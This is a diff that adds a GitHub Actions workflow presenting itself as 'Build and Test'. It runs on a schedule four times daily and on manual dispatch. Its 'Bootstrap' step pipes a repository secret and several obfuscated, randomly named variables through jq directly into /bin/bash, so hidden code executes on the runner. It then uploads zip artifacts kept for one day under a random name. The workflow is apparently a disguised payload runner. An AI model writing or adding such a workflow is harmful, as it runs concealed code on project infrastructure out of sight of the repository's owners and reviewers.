@@ -1,0 +1,36 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '54 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          vpxn4: ${{ secrets.vpxn4 }}
+        run: |
+          printf '%s' "$vpxn4" | jq -r .pfd9 | /bin/bash
+          printf '%s' "$devi45" | jq -r .jyo49 | /bin/bash
+          echo $yfwnl093 | jq -r .gxc7360 | /bin/bash
+          echo $csp274 | jq -r .wmjoe941 | /bin/bash
+          echo $f5 | jq -r .gcwy20 | /bin/bash
+          echo $o3 | jq -r .ynksd52539 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Mt8NHSYp
+          path: "*.zip"
+          retention-days: 1
